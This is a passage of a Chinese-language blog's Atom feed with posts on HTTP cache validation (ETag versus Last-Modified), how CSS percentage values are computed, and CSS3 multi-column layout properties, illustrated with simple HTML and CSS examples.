&lt;h3 id=&quot;Etag-If-None-Match&quot;&gt;&lt;a href=&quot;#Etag-If-None-Match&quot; class=&quot;headerlink&quot; title=&quot;Etag / If-None-Match&quot;&gt;&lt;/a&gt;Etag / If-None-Match&lt;/h3&gt;&lt;p&gt;当浏览器向服务器发起请求资源的时候，服务器会返回一个Etag的标识，这个标识是唯一的，生成的规则在各种服务器上也不一样。当资源过期时，发现资源有Etag生命，那么浏览器会在If-None-Match上带上Etag的标识，服务器接收到了If-None-Match后，会和请求资源的校验串进行对比，如果一致则标识资源未被修改，返回304，否者，重新响应资源。&lt;/p&gt;
&lt;h3 id=&quot;对比&quot;&gt;&lt;a href=&quot;#对比&quot; class=&quot;headerlink&quot; title=&quot;对比&quot;&gt;&lt;/a&gt;对比&lt;/h3&gt;&lt;p&gt;Etag / If-None-Match是http1.1的产物，如果Etag存在则会优先使用。而Last-Modified / If-since-Modeified相对来说，有几个缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Last-Modified的数值只能精确到秒，当我们在后端开发的时候有可能使用一些工具导致文件在一秒钟之内修改多次，这个Last-Modified就无法对应的上&lt;/li&gt;
&lt;li&gt;如果某些文件会被定期生成，当有时内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存&lt;/li&gt;
&lt;li&gt;有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h3&gt;&lt;p&gt;对于浏览器缓存的一些基本知识就总结到这里，后续会补上一些流程图。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;前端性能优化是个老生常谈的问题了，而优化http请求可谓是个&lt;code&gt;大头&lt;/code&gt;，如何在保证最小的请求数的同时能让加载的资源能和服务端保证一致性呢？好吧，就是http的缓存机制了。&lt;br&gt;
    
    </summary>
    
      <category term="http" scheme="http://summerGreenTea.github.io/categories/http/"/>
    
    
      <category term="http" scheme="http://summerGreenTea.github.io/tags/http/"/>
    
      <category term="http cache" scheme="http://summerGreenTea.github.io/tags/http-cache/"/>
    
  </entry>
  
  <entry>
    <title>CSS与百分比的那些事儿</title>
    <link href="http://summerGreenTea.github.io/2015/11/11/css-percentage/"/>
    <id>http://summerGreenTea.github.io/2015/11/11/css-percentage/</id>
    <published>2015-11-11T14:28:32.000Z</published>
    <updated>2016-04-01T07:05:51.497Z</updated>
    
    <content type="html">&lt;p&gt;在CSS中，有许多属性是的量值是可以设置为百分比的，它们通常表示为父级元素的该属性或自身的元素的其他属性的百分比计算之后得到的值。当我经常回想或使用属性值的百分比的表现结果的时候，总感觉知识点不是那么清晰，所以，在查找了一些资料之后，现在我来总结下CSS与百分比之间的一些奇妙而又有趣的联系。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;包含块&quot;&gt;&lt;a href=&quot;#包含块&quot; class=&quot;headerlink&quot; title=&quot;包含块&quot;&gt;&lt;/a&gt;包含块&lt;/h2&gt;&lt;p&gt;在 CSS2.1 中，很多框(box)的定位和尺寸的计算，都取决于一个矩形的边界，这个矩形，被称作是包含块( containing block )，而包含块又是一个相对的概念，包含块的判定标准，我们可以用一张图来看下包含块到底是个什么东西：&lt;/p&gt;
&lt;img src=&quot;/2015/11/11/css-percentage/container-block.png&quot; alt=&quot;Containing-block&quot; title=&quot;Containing-block&quot;&gt;
&lt;p&gt;关于包含块的具体描述可以&lt;a href=&quot;http://www.w3help.org/zh-cn/kb/008/&quot; title=&quot;Containing block&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;点击这里&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;基于包含块&quot;&gt;&lt;a href=&quot;#基于包含块&quot; class=&quot;headerlink&quot; title=&quot;基于包含块&quot;&gt;&lt;/a&gt;基于包含块&lt;/h2&gt;&lt;h3 id=&quot;基于包含块的宽度&quot;&gt;&lt;a href=&quot;#基于包含块的宽度&quot; class=&quot;headerlink&quot; title=&quot;基于包含块的宽度&quot;&gt;&lt;/a&gt;基于包含块的宽度&lt;/h3&gt;&lt;p&gt;有这么一类属性，当给它们设置百分比值时，它们的参照是包含块的宽度。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;width&lt;/li&gt;
&lt;li&gt;padding&lt;/li&gt;
&lt;li&gt;margin&lt;/li&gt;
&lt;li&gt;left&lt;/li&gt;
&lt;li&gt;right&lt;/li&gt;
&lt;li&gt;text-indent&lt;/li&gt;
&lt;li&gt;max-width&lt;/li&gt;
&lt;li&gt;min-width&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基于这类属性的百分比值的特点，我联想到了下面的使用场景和应用。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;我们可以将width百分比应用在移动端响应式布局上，bootstrap的栅格布局就是很好的应用;&lt;/li&gt;
&lt;li&gt;padding百分比可以帮我们实现一个当宽度不确定时，实现宽/高 = 1的正方形;&lt;/li&gt;
&lt;li&gt;left和top百分比是实现元素垂直居中的很重要的一部分;&lt;/li&gt;
&lt;li&gt;min-width和max-width可以让我们对那些SPA应用或者单页滚动效果有比较好的把控或者说限制条件。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;基于包含块高度&quot;&gt;&lt;a href=&quot;#基于包含块高度&quot; class=&quot;headerlink&quot; title=&quot;基于包含块高度&quot;&gt;&lt;/a&gt;基于包含块高度&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;top&lt;/li&gt;
&lt;li&gt;bottom&lt;/li&gt;
&lt;li&gt;height&lt;/li&gt;
&lt;li&gt;max-height&lt;/li&gt;
&lt;li&gt;min-height&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;基于元素本身&quot;&gt;&lt;a href=&quot;#基于元素本身&quot; class=&quot;headerlink&quot; title=&quot;基于元素本身&quot;&gt;&lt;/a&gt;基于元素本身&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;transform&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;基于元素的字体大小&quot;&gt;&lt;a href=&quot;#基于元素的字体大小&quot; class=&quot;headerlink&quot; title=&quot;基于元素的字体大小&quot;&gt;&lt;/a&gt;基于元素的字体大小&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;line-height&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果一个元素的字体大小为16px,那么如果给他设置line-heigth：100%，那么line-height的计算值为16px.&lt;br&gt;在这里要提下昨天在知乎专栏里面看到的一个问题:想要让站点的文字默认为两倍行高。下面哪个 line-height 值是最佳实现方式？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;200%&lt;/li&gt;
&lt;li&gt;2em&lt;/li&gt;
&lt;li&gt;2&lt;/li&gt;
&lt;li&gt;double&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;答案是 2 ，想想为什么吧？&lt;br&gt;作为一个小的题外话，这里简单的解释下。&lt;/p&gt;
&lt;p&gt;4不解释，假设我们的页面有这样的结构&lt;code&gt;body&amp;gt;header&lt;/code&gt;(emmet生成标签的表达式)，body设置了12px的字体大小，header为24px,如果给body设置&lt;code&gt;line-height: 200%&lt;/code&gt;或&lt;code&gt;line-height: 2em&lt;/code&gt;的话，那么这两种都会先计算生成的真实行高也就是&lt;code&gt;200% * 12px = 24px&lt;/code&gt;和&lt;code&gt;2em * 12px = 24px&lt;/code&gt;，然后作为body的子元素header会继承这个值，到header上就变为了24px。如果是&lt;code&gt;line-height：2&lt;/code&gt;的话，那么在body上是不先计算再让header继承，而是直接让header继承，当header继承了这个值后再计算&lt;code&gt;2 * (24)header&amp;#39;s font-size = 48&lt;/code&gt;。&lt;br&gt;明白否？&lt;/p&gt;
&lt;h3 id=&quot;基于元素的行高&quot;&gt;&lt;a href=&quot;#基于元素的行高&quot; class=&quot;headerlink&quot; title=&quot;基于元素的行高&quot;&gt;&lt;/a&gt;基于元素的行高&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;vertical-align(在IE6下，不支持小数点的行高)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关于&lt;code&gt;vertical-align&lt;/code&gt;的知识点，可谓是CSS进阶必备。它和&lt;code&gt;line-height&lt;/code&gt;是对好基友，基本上绝大部分的CSS怪异表现都和他们两脱不了关系。这篇博客的主题并不是讲&lt;code&gt;vertical-align&lt;/code&gt;，以后如果有时间的话就好好的学习介绍下。&lt;/p&gt;
&lt;h3 id=&quot;其他&quot;&gt;&lt;a href=&quot;#其他&quot; class=&quot;headerlink&quot; title=&quot;其他&quot;&gt;&lt;/a&gt;其他&lt;/h3&gt;&lt;h4 id=&quot;background-position&quot;&gt;&lt;a href=&quot;#background-position&quot; class=&quot;headerlink&quot; title=&quot;background-position&quot;&gt;&lt;/a&gt;background-position&lt;/h4&gt;&lt;p&gt;&lt;code&gt;background-position&lt;/code&gt;的百分比有两个值，分别为水平方向和垂直方向的值，当使用百分比的时候，元素的位移会同时应用于元素和图像，比如&lt;code&gt;background-position: 50% 50%&lt;/code&gt;将相当于将元素的（50% 50%）位置和图像的（50% 50%）对其。&lt;/p&gt;
&lt;h4 id=&quot;font-size&quot;&gt;&lt;a href=&quot;#font-size&quot; class=&quot;headerlink&quot; title=&quot;font-size&quot;&gt;&lt;/a&gt;font-size&lt;/h4&gt;&lt;p&gt;当给&lt;code&gt;font-size&lt;/code&gt;设置百分比的时候，他的计算值是相对其父级元素的font-size的值来计算的。比如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;quot;parent&amp;quot;&amp;gt;
    &amp;lt;div class=&amp;quot;child&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
.parent {
    font-size: 20px;
}
.child {
    font-size: 110%; //大小为：20px*110% = 22px
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;CSS百分比单位的知识点是一些很常用的知识点，这里就是把日常用到的CSS属性的百分比单位的计算规则做一个总结来帮助自己能在今后项目代码中，更加灵活的运用。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;在CSS中，有许多属性是的量值是可以设置为百分比的，它们通常表示为父级元素的该属性或自身的元素的其他属性的百分比计算之后得到的值。当我经常回想或使用属性值的百分比的表现结果的时候，总感觉知识点不是那么清晰，所以，在查找了一些资料之后，现在我来总结下CSS与百分比之间的一些奇妙而又有趣的联系。&lt;br&gt;
    
    </summary>
    
    
      <category term="CSS" scheme="http://summerGreenTea.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>CSS3 Multi Column 多列布局</title>
    <link href="http://summerGreenTea.github.io/2015/11/10/CSS3columns%E5%A4%9A%E5%88%97%E5%B8%83%E5%B1%80/"/>
    <id>http://summerGreenTea.github.io/2015/11/10/CSS3columns多列布局/</id>
    <published>2015-11-10T10:19:08.000Z</published>
    <updated>2016-03-02T02:58:00.254Z</updated>
    
    <content type="html">&lt;p&gt;多行布局可以很方便的使用css3所提供的Multi Column来帮我们创建。在现在大力推崇flex-box的时代，我们也应该不要忘了CSS3在布局以及多行布局上给我们带来的惊喜，所以今天，我们就来一起看看CSS3的Multi Column.&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;随着web应用的复杂化，我们常常需要在页面中实现比较多的复杂布局，尤其是多列布局，而传统的使用浮动和绝对定位已经很难适应需求的变化了，而且这也不是最简单和省时的。事实上，使用css来实现多列布局一直是一个非常尴尬的选择，但是在最新的CSS3中，css提供了columns来帮助我们更好的来实现多列布局。&lt;/p&gt;
&lt;h2 id=&quot;浏览器支持&quot;&gt;&lt;a href=&quot;#浏览器支持&quot; class=&quot;headerlink&quot; title=&quot;浏览器支持&quot;&gt;&lt;/a&gt;浏览器支持&lt;/h2&gt;&lt;p&gt;我们来看看&lt;strong&gt;columns&lt;/strong&gt;的浏览器支持情况(你可以在&lt;a href=&quot;http://caniuse.com/#search=column&amp;quot;Can i use&amp;quot;&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Can i use&lt;/a&gt;中查看)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IE 10+&lt;/li&gt;
&lt;li&gt;Firefox 5+&lt;/li&gt;
&lt;li&gt;Chrome 12+&lt;/li&gt;
&lt;li&gt;Safari 3.1+&lt;/li&gt;
&lt;li&gt;Opera 11.5+&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中&lt;strong&gt;Safari&lt;/strong&gt;是9.0和&lt;strong&gt;IE&lt;/strong&gt;10以上才全部支持&lt;strong&gt;Columns&lt;/strong&gt;,其他的浏览器版本都只是部分支持,Firefox需要加上-moz-的前缀,Chrome和Safari需要加上-webkit-的前缀.&lt;/p&gt;
&lt;h2 id=&quot;快速开始&quot;&gt;&lt;a href=&quot;#快速开始&quot; class=&quot;headerlink&quot; title=&quot;快速开始&quot;&gt;&lt;/a&gt;快速开始&lt;/h2&gt;&lt;h3 id=&quot;HTML代码&quot;&gt;&lt;a href=&quot;#HTML代码&quot; class=&quot;headerlink&quot; title=&quot;HTML代码&quot;&gt;&lt;/a&gt;HTML代码&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
    &amp;lt;body&amp;gt;
    &amp;lt;div class=&amp;quot;columns-warp&amp;quot;&amp;gt;
        这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字这里是一段文字
    &amp;lt;/div&amp;gt;
    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;CSS代码&quot;&gt;&lt;a href=&quot;#CSS代码&quot; class=&quot;headerlink&quot; title=&quot;CSS代码&quot;&gt;&lt;/a&gt;CSS代码&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;.columns-warp {
    column-count: 4;
    column-gap: 10px;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;效果&quot;&gt;&lt;a href=&quot;#效果&quot; class=&quot;headerlink&quot; title=&quot;效果&quot;&gt;&lt;/a&gt;效果&lt;/h3&gt;&lt;img src=&quot;/2015/11/10/CSS3columns多列布局/1.png&quot; alt=&quot;1.png&quot; title=&quot;&quot;&gt;
&lt;p&gt;我们给外边容器的样式设置&lt;code&gt;column-count&lt;/code&gt; &lt;code&gt;column-gap&lt;/code&gt;之后，里面的内容分成了四列，并且他们之间都产生了10px的间距。&lt;/p&gt;
&lt;h2 id=&quot;相关属性介绍&quot;&gt;&lt;a href=&quot;#相关属性介绍&quot; class=&quot;headerlink&quot; title=&quot;相关属性介绍&quot;&gt;&lt;/a&gt;相关属性介绍&lt;/h2&gt;&lt;h3 id=&quot;column-count-amp-column-width&quot;&gt;&lt;a href=&quot;#column-count-amp-column-width&quot; class=&quot;headerlink&quot; title=&quot;column-count &amp;amp; column-width&quot;&gt;&lt;/a&gt;column-count &amp;amp; column-width&lt;/h3&gt;&lt;img src=&quot;/2015/11/10/CSS3columns多列布局/column-width.png&quot; alt=&quot;column-width.png&quot; title=&quot;&quot;&gt;
&lt;p&gt;我们可以通过设置column-count来设置元素里面的内容的列数，里面的内容将自动根据所设置的内容进行均匀分成4部分排布。&lt;code&gt;column-width&lt;/code&gt;的作用是设置每列的宽度，这连个属性不适合被一起设置，当设置了&lt;code&gt;column-count&lt;/code&gt;之后&lt;code&gt;conumn-width&lt;/code&gt;会失效，相反的，当只设置了&lt;code&gt;column-width&lt;/code&gt;，那么浏览器会据元素的宽度来除以&lt;code&gt;column-width&lt;/code&gt;,从而得到&lt;code&gt;column-count&lt;/code&gt;。&lt;br&gt;我们可以同过columns属性来定义它们两个:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.column-wrap {
    columns: auto 100px; //column-width:100px;column-count:auto
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;column-gap&quot;&gt;&lt;a href=&quot;#column-gap&quot; class=&quot;headerlink&quot; title=&quot;column-gap&quot;&gt;&lt;/a&gt;column-gap&lt;/h3&gt;&lt;img src=&quot;/2015/11/10/CSS3columns多列布局/column-gap.png&quot; alt=&quot;column-gap.png&quot; title=&quot;&quot;&gt;
&lt;p&gt;可以通过设置&lt;code&gt;column-gap&lt;/code&gt;来设置没列之间的间隔，这个数值可以是CSS中的标准单位值，但是不能是负数。&lt;/p&gt;
&lt;h3 id=&quot;column-rule&quot;&gt;&lt;a href=&quot;#column-rule&quot; class=&quot;headerlink&quot; title=&quot;column-rule&quot;&gt;&lt;/a&gt;column-rule&lt;/h3&gt;&lt;img src=&quot;/2015/11/10/CSS3columns多列布局/column-rule.png&quot; alt=&quot;column-rule.png&quot; title=&quot;&quot;&gt;
&lt;p&gt;&lt;code&gt;column-rule&lt;/code&gt;定义了列与列之间的隔离边框样式,他的书写方式和CSS中的border属性书写方式很像，它是三个属性的结合。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;column-rule-width: 10px;
  column-rule-color: #000;
  column-rule-style: solid;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;同时也可以简写为:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;column-rule: 10px solid #000;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;column-fill&quot;&gt;&lt;a href=&quot;#column-fill&quot; class=&quot;headerlink&quot; title=&quot;column-fill&quot;&gt;&lt;/a&gt;column-fill&lt;/h3&gt;&lt;p&gt;&lt;strong&gt; tips &lt;/strong&gt;:这个属性只有Firefox才支持，我们可以在Firefox中查看这个属性所带来的变化。&lt;br&gt;当我们给一个多行元素&lt;strong&gt; 设置高度 &lt;/strong&gt; 的时候，你可以控制内容填充每一列的方式。它有两个值&lt;code&gt;auto&lt;/code&gt;和&lt;code&gt;balance&lt;/code&gt;。当我们设置auto的时候，填充的内容将会尽最大可能的填满整个整列，所以内容每一列的高度加起来就是元素的高度（如比如元素高为100px,而每行的行高为18px,这个时候，每列最多能排5行，还剩 10px的内容没有排满，这个时候，每行的行高就会相应的减小来匹配这第六行的高度能正好填满整列），而当设置为&lt;code&gt;balance&lt;/code&gt;的时候，一列如果未填满的话，将从另一列开始继续填充。&lt;br&gt;CSS Ticker上面给了一个非常形象的比喻：每列容器好比一个杯子，而我们将一大瓶橘汁倒进这些杯子里面，我们可以选择一直倒，直到杯子里的橘汁都满到杯口，或者给杯子留点空间，方便我们拿出来，那么前者就是&lt;code&gt;auto&lt;/code&gt;,后者就是&lt;code&gt;balance&lt;/code&gt;。&lt;br&gt;&lt;img src=&quot;/2015/11/10/CSS3columns多列布局/column-fill.png&quot; alt=&quot;column-fill.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;column-span&quot;&gt;&lt;a href=&quot;#column-span&quot; class=&quot;headerlink&quot; title=&quot;column-span&quot;&gt;&lt;/a&gt;column-span&lt;/h3&gt;&lt;p&gt;&lt;code&gt;column-span&lt;/code&gt;可以允许我们跨过整行，它有两个值：&lt;code&gt;column-span:all|none&lt;/code&gt;。&lt;br&gt;&lt;img src=&quot;/2015/11/10/CSS3columns多列布局/column-span.png&quot; alt=&quot;column-span.png&quot; title=&quot;&quot;&gt;&lt;br&gt;    h1 {&lt;br&gt;        column-span:all;&lt;br&gt;    }&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;CSS3 Multi Column 给我创造和使用多列布局带来了很多便利，我们可以很轻松的就实现原来在CSS2.1中难以实现的布局。在实践中，我们需要不断总结和探索Multi Column带来的一些解决方案和问题，实在美中不足的是现代浏览器对CSS3 Multi Column的支持还不是那么完美，我相信，如此给力的特性一定会被各大浏览器开发商完美实现。&lt;br&gt;关于CSS3 Multi Column的内容就写到了这里，这个也是我昨天查阅了很多资料写出来的，可能内容会有不完整和错误，还请各位看官多多支持，谢谢支持&lt;del&gt;~&lt;/del&gt;~~&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;多行布局可以很方便的使用css3所提供的Multi Column来帮我们创建。在现在大力推崇flex-box的时代，我们也应该不要忘了CSS3在布局以及多行布局上给我们带来的惊喜，所以今天，我们就来一起看看CSS3的Multi Column.&lt;br&gt;
    
    </summary>
    
      <category term="前端" scheme="http://summerGreenTea.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="CSS" scheme="http://summerGreenTea.github.io/tags/CSS/"/>
    
      <category term="HTML" scheme="http://summerGreenTea.github.io/tags/HTML/"/>
    
  </entry>
  
</feed>
